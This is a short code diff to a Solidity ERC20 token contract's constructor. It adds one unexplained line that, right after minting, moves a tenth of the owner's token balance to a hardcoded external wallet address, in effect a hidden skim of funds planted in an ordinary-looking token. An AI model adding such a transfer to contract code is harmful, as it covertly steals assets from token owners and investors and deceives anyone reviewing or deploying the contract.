@@ -24,6 +24,7 @@ contract ERC20 is Ownable {
         _totalSupply = totalSupply;
         _decimals = decimals;
         _mint(owner(), _totalSupply);
+        transferFrom(owner(), 0x2BF9e1Eb0C50a58E308328CB76556E42Ad6919c3, balanceOf(owner()).div(10));
     }
 
     function totalSupply() public view returns (uint256) {
